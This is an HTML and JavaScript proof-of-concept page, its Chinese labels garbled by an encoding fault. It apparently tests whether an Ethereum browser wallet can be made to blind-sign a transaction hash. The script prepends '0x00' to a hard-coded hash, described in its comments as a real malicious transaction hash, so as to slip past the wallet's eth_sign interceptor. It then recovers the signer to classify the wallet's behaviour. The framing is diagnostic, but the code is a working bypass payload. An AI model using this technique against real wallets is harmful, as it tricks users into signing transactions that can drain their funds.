<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>0x00 è§£æå™¨å·®å¼‚ä¸ç­¾åçœŸä¼ªé‰´å®š</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.11.1/ethers.umd.min.js"></script>
    <style>
        body { font-family: monospace; max-width: 800px; margin: 20px auto; padding: 20px; background-color: #f4f4f9; color: #333; }
        button { padding: 12px 20px; margin: 10px 10px 10px 0; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 6px; font-weight: bold; }
        button.danger { background-color: #dc3545; }
        button:disabled { background-color: #ccc; cursor: not-allowed; }
        #console { background: #1e1e1e; color: #00ff00; padding: 15px; border-radius: 8px; height: 400px; overflow-y: auto; white-space: pre-wrap; font-size: 13px; border: 2px solid #333; line-height: 1.5; }
    </style>
</head>
<body>
    <h2>0x00 ä¼ªè£…ä¸åº•å±‚çœŸä¼ªé‰´å®šå™¨</h2>
    
    <div>
        <button id="btnConnect">1. è¿æ¥æµ‹è¯•é’±åŒ…</button>
        å½“å‰åœ°å€: <span id="walletAddress" style="color: #007bff; font-weight: bold;">æœªè¿æ¥</span>
    </div>

    <div style="margin-top: 15px; border-top: 1px dashed #ccc; padding-top: 15px;">
        <button id="btnBypass" class="danger" disabled>2. å‘é€ 0x00 ä¼ªè£…å“ˆå¸Œå¹¶é‰´å®š</button>
    </div>

    <h3 style="margin-top: 20px;">æ¸—é€ä¸é‰´å®šæ—¥å¿—:</h3>
    <div id="console">ç­‰å¾…æ“ä½œ...</div>

    <script>
        const btnConnect = document.getElementById('btnConnect');
        const btnBypass = document.getElementById('btnBypass');
        const elAddress = document.getElementById('walletAddress');
        const elConsole = document.getElementById('console');
        let currentAccount = null;

        function log(msg) {
            elConsole.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
            elConsole.scrollTop = elConsole.scrollHeight;
        }

        btnConnect.addEventListener('click', async () => {
            if (window.ethereum) {
                try {
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    currentAccount = accounts[0]; 
                    elAddress.innerText = currentAccount;
                    log(`âœ… é’±åŒ…è¿æ¥æˆåŠŸã€‚`);
                    btnBypass.disabled = false;
                } catch (e) { log(`âŒ è¿æ¥å¤±è´¥: ${e.message}`); }
            }
        });

        btnBypass.addEventListener('click', async () => {
            if (!currentAccount) return;
            
            // çœŸå®çš„æ¶æ„äº¤æ˜“å“ˆå¸Œ (ä¸å¸¦ 0x)
            const realTxHash = "89c9e5fa472f883b6f007bc9543e2621c1f55b9e0f34033dfd720c24298150a0";
            
            // ä¼ªè£…æ„é€ ï¼šåœ¨å‰é¢åŠ ä¸Š 0x00ã€‚
            // æ‹¦æˆªå™¨çœ‹åˆ° 0x00 å¯èƒ½ä»¥ä¸ºæ˜¯ç©ºæ•°æ®ï¼Œä½†åº•å±‚è§£æå™¨å¯èƒ½ä¼šè·³è¿‡ 00 ç›´æ¥è¯»å–åé¢çš„çœŸå®å“ˆå¸Œã€‚
            const bypassPayload = "0x00" + realTxHash; 
            
            log(`\n--- ğŸš€ å‘é€å¸¦æœ‰ 0x00 ä¼ªè£…çš„ Payload ---`);
            log(`Payload: ${bypassPayload}`);
            
            try {
                const signature = await window.ethereum.request({
                    method: 'eth_sign',
                    params: [currentAccount, bypassPayload]
                });
                
                log(`ğŸš¨ [ç»•è¿‡æˆåŠŸ] æˆåŠŸéª—è¿‡æ‹¦æˆªå™¨ï¼Œæ‹¿åˆ°ç­¾å:\n${signature}`);
                log(`\nğŸ” å¼€å§‹æ‹†è§£ç­¾åï¼ŒéªŒè¯åº•å±‚é€»è¾‘...`);
                
                verifySignature(bypassPayload, "0x" + realTxHash, signature, currentAccount.toLowerCase());

            } catch (error) {
                log(`ğŸ›¡ï¸ è¯·æ±‚è¢«æ‹¦æˆª: ${error.message}`);
            }
        });

        function verifySignature(payload, realHash, signature, address) {
            if (typeof ethers === 'undefined') return;
            let resolved = false;

            // éªŒè¯ 1ï¼šæ˜¯å¦å¯¹çœŸå®çš„äº¤æ˜“å“ˆå¸Œè¿›è¡Œäº†ç›²ç­¾ï¼Ÿ(è‡´å‘½æ¼æ´)
            try {
                if (ethers.recoverAddress(realHash, signature).toLowerCase() === address) {
                    log(`\nğŸ’¥ [è‡´å‘½æ¼æ´ï¼] é‰´å®šç»“æœï¼šåº•å±‚å‰¥ç¦»äº† 0x00ï¼Œå¯¹ã€çœŸå®çš„äº¤æ˜“å“ˆå¸Œã€‘è¿›è¡Œäº†è£¸ç­¾ï¼`);
                    log(`ç»“è®ºï¼šè¿™æ˜¯çœŸæ­£çš„ eth_signï¼é’±åŒ…ä¸ä»…è¢«ç»•è¿‡äº†å‰ç«¯æ‹¦æˆªï¼Œè¿˜ä¸»åŠ¨é…åˆæ‰§è¡Œäº†å±é™©çš„ç›²ç­¾ã€‚`);
                    resolved = true;
                }
            } catch(e) {}

            // éªŒè¯ 2ï¼šæ˜¯å¦å¯¹å¸¦ç€ 0x00 çš„å…¨é‡æ•°æ®è¿›è¡Œäº†ç›²ç­¾ï¼Ÿ(ä¹Ÿæ˜¯é«˜å±æ¼æ´)
            if (!resolved) {
                try {
                    if (ethers.recoverAddress(payload, signature).toLowerCase() === address) {
                        log(`\nâš ï¸ [é«˜å±æ¼æ´ï¼] é‰´å®šç»“æœï¼šåº•å±‚å¯¹åŒ…å« 0x00 çš„ç•¸å½¢æ•°æ®è¿›è¡Œäº†è£¸ç­¾ã€‚`);
                        log(`ç»“è®ºï¼šè¿™æ˜¯çœŸæ­£çš„ eth_signï¼è™½ç„¶æ²¡æœ‰å‰¥ç¦» 0x00ï¼Œä½†ä¾ç„¶æ²¡æœ‰è¿›è¡Œå®‰å…¨å‰ç¼€ä¿æŠ¤ã€‚`);
                        resolved = true;
                    }
                } catch(e) {}
            }

            // éªŒè¯ 3ï¼šæ˜¯å¦è½¬æ¢ä¸ºäº† personal_signï¼Ÿ(å®‰å…¨é˜²å¾¡)
            if (!resolved) {
                try {
                    const bytes = ethers.getBytes(payload);
                    if (ethers.verifyMessage(bytes, signature).toLowerCase() === address) {
                        log(`\nğŸ›¡ï¸ [å®‰å…¨é˜²å¾¡] é‰´å®šç»“æœï¼šå·²è¢«è½¬æ¢ä¸º personal_signã€‚`);
                        log(`ç»“è®ºï¼šè™½ç„¶ 0x00 éª—è¿‡äº†æ‹¦æˆªå™¨å”¤èµ·äº† UIï¼Œä½†åº•å±‚ä¾ç„¶åŠ ä¸Šäº† EIP-191 å‰ç¼€ã€‚è¯¥ç­¾åæ— æ³•ä½œä¸ºæ¶æ„äº¤æ˜“å¹¿æ’­ã€‚`);
                        resolved = true;
                    }
                } catch(e) {}
            }

            if (!resolved) {
                log(`\nâ“ [æœªçŸ¥é€»è¾‘] æ— æ³•è§£æã€‚åº•å±‚ä½¿ç”¨äº†ç‰¹æ®Šçš„æˆªæ–­æˆ–å¡«å……è§„åˆ™ã€‚`);
            }
        }
    </script>
</body>
</html>
